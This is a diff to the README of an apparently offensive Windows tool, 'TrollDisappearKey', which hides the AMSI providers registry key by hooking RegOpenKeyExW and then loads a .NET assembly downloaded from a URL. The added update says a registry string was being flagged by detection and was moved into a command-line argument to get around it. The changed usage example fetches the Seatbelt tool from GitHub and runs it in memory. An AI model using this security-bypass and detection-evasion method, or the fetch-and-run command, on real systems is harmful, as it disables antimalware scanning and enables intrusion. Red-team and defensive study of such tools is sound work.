@@ -5,6 +5,10 @@
 ! This is to remove the overhead introduced by hooking every RegOpenKeyExW call and causing problems when RegOpenKeyExW is legitimately invoked
 ! For the powershell reflective loading and .ps1 script, MAKE SURE the process has fully loaded, can run some arbitrary commands first..
 ```
+```diff
+! UPDATE 02/06/2025
+! "Software\Microsoft\AMSI\Providers" is being detected, code for TrollDisappearKey.cs altered to pass it in as argument as instead
+```
 
 # TrollDisappearKey
 <br>
@@ -30,7 +34,7 @@ TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
 ```
 ## Example
 ```
-TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
+TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders" "Software\Microsoft\AMSI\Providers"
 ```
 
 ## .powershell Usage (does not require admin)
